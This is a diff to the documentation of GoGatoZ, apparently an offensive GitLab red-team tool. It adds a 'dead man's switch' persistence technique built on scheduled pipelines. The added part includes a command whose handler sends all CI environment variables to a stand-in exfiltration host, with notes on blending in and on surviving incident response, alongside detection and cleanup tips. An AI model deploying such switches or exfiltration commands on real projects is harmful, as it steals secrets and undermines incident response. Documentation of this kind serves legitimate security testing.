@@ -16,6 +16,7 @@ After gaining initial access to a GitLab project (typically via a compromised PA
 | Deploy Key | Yes | Git clone/push via SSH | `api` + project Maintainer role |
 | Member Addition | Yes | Full GitLab access for added user | `api` + project Maintainer role |
 | MR Pwn Request | Yes | Command execution via CI | `api` + `write_repository` |
+| Dead Man's Switch | Yes | Triggered command execution | `api` + `write_repository` |
 
 Each technique is independent — combining all three creates a resilient persistence chain.
 
@@ -174,15 +175,52 @@ gogatoz attack --target group/project --cleanup \
 
 This table shows which persistence techniques survive each defensive action:
 
-| Defensive Action | Deploy Key | Added Member | MR Pwn Request |
-|-----------------|-----------|-------------|----------------|
-| Rotate compromised PAT | Survives | Survives | Survives |
-| Change user password | Survives | Survives | Survives |
-| Enable MFA | Survives | Partial (user must set up MFA) | Survives |
-| Remove user from project | Survives | Removed | Survives |
-| Revoke deploy keys | Removed | Survives | Survives |
-| Delete attack branch | Survives | Survives | Removed |
-| All three combined | Removed | Removed | Removed |
+| Defensive Action | Deploy Key | Added Member | MR Pwn Request | Dead Man's Switch |
+|-----------------|-----------|-------------|----------------|-------------------|
+| Rotate compromised PAT | Survives | Survives | Survives | Survives |
+| Change user password | Survives | Survives | Survives | Survives |
+| Enable MFA | Survives | Partial (user must set up MFA) | Survives | Survives |
+| Remove user from project | Survives | Removed | Survives | Survives |
+| Revoke deploy keys | Removed | Survives | Survives | Survives |
+| Delete attack branch | Survives | Survives | Removed | Survives |
+| Delete scheduled pipelines | Survives | Survives | Survives | Removed |
+| All four combined | Removed | Removed | Removed | Removed |
+
+## Dead Man's Switch
+
+A dead man's switch provides a fail-safe persistence mechanism: a scheduled process periodically pings a monitor URL controlled by the attacker. If the URL stops responding (because the attacker's access was revoked or infrastructure was taken down), the switch triggers a handler payload.
+
+### How it works
+
+1. GoGatoZ creates a GitLab scheduled pipeline (or external cron job) that runs at a configurable interval
+2. Each run pings the `--dms-monitor-url` to confirm the attacker is still active
+3. If the monitor fails to respond within `--dms-ttl`, the handler payload fires
+4. The handler can exfiltrate remaining secrets, notify a backup channel, or deploy additional persistence
+
+### Deploying a dead man's switch
+
+```bash
+gogatoz attack --dead-mans-switch --target group/project \
+  --dms-monitor-url https://attacker.example/heartbeat \
+  --dms-interval 1h --dms-ttl 24h \
+  --dms-handler 'curl -sd "$(printenv)" https://backup.example/exfil' \
+  --dms-platform scheduled-pipeline
+```
+
+**Platform options:**
+- `scheduled-pipeline` (default): Creates a GitLab scheduled pipeline. Blends with existing scheduled CI jobs and requires no runner-level persistence.
+- `external-cron`: Generates a cron job payload for the runner filesystem. Requires prior runner compromise but survives project-level cleanup.
+
+**Why it persists**: Scheduled pipelines are often overlooked during incident response. The switch operates independently of the compromised token — once installed, it runs under the project's CI infrastructure.
+
+**Detection**: Check project CI/CD > Schedules for unexpected entries. Monitor for scheduled pipelines with unusual script content or external HTTP calls.
+
+### Cleanup
+
+```bash
+gogatoz attack --target group/project --cleanup \
+  --cleanup-pipeline <SCHEDULED_PIPELINE_ID>
+```
 
 ## Mitigation Recommendations
 
@@ -198,3 +236,4 @@ This table shows which persistence techniques survive each defensive action:
 - [Persistence Command Reference](/user-guide/command-reference/persistence/) for all flags and options
 - [Post-Compromise Enumeration](/user-guide/use-cases/post-compromise/) for initial access workflows
 - [Runner Takeover](/user-guide/use-cases/runner-takeover/) for self-hosted runner exploitation
+- [Advanced Supply Chain Attacks](/user-guide/use-cases/advanced-supply-chain/) for dead man's switch in a full supply chain workflow
